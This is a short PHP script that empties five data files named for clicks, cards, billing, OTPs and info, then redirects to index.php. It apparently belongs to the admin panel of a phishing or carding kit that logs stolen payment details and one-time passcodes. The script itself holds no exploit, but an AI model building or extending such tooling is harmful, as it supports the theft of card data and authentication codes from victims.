<?php
$sectionFileMap = [
    'click'   => 'click',
    'cc'      => 'cards',
    'billing' => 'billing',
    'sms'     => 'otps',
    'info'    => 'info',
];

foreach ($sectionFileMap as $fileKey) {
    $filePath = __DIR__ . "/data/{$fileKey}.txt";
    @file_put_contents($filePath, '');
}

header("Location: index.php");
exit;
?>